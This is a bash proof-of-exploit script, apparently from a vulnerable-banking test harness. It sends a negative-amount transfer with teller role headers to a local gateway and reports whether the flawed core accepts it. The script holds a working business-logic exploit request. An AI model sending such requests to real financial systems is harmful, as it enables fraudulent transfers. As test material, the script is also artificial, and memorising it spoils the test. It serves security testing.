#!/usr/bin/env bash
set -euo pipefail
# LG-BIZ-001 proof-of-exploit: negative-amount transfer. Fires (exit 0) when a transfer with a
# NEGATIVE amount is accepted (status=POSTED) and the balances move backwards (from-account rises).
# A correct core rejects amount <= 0, so this never fires on `fixed`. Unconditional (any profile).
# Needs the running stack; operator-side only. Env: GATEWAY_URL (default http://localhost:8080).

GATEWAY_URL="${GATEWAY_URL:-http://localhost:8080}"

resp="$(curl -sS -X POST "$GATEWAY_URL/transfer" -H 'content-type: application/json' \
  -H 'X-Staff-Id: TLR001' -H 'X-Role: TELLER' -H 'X-Branch: 0007' \
  -d '{"token":"TRIGGERTOKEN0001","from_account":"000000000042","to_account":"000000000043","amount":"-100.00","currency":"USD","requested_by":"0000000007"}')"

read -r status fb <<<"$(python3 -c 'import sys,json
d=json.load(sys.stdin); print(d.get("status"), d.get("from_balance",""))' <<<"$resp")"

# Exploited iff a negative amount POSTED. (from_balance rising vs a normal debit corroborates it.)
if [ "$status" = "POSTED" ]; then
  echo "LG-BIZ-001 FIRED: negative amount POSTED (from_balance=$fb) -> $resp"
  exit 0
fi
echo "LG-BIZ-001 not fired: $resp" >&2
exit 1
